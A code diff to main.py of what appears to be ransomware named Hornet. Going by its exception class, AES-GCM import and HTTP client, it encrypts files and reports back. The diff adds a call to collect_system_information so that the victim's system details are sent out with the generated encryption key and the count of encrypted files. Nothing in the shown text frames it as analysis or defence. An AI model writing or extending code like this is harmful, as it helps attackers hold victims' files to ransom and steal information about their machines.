@@ -1,8 +1,8 @@
 # main.py
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM          # AESGCM protocol suite
-
 from typing import List, Dict, Union, Any
 from rich.console import Console
+from informations import collect_system_information
 from exceptions import HornetRansomwareException
 import requests
 import secrets
@@ -165,7 +165,8 @@ if __name__ == "__main__":
     console.log(f"Key was generated: {key_hex[:10]}...")
     data: Dict[str, Any] = {
         "key": key_hex,
-        "number_of_files_encrypted": number_of_files_encrypted
+        "number_of_files_encrypted": number_of_files_encrypted,
+        "system_information": collect_system_information()
     }
 
     if send_data(data):
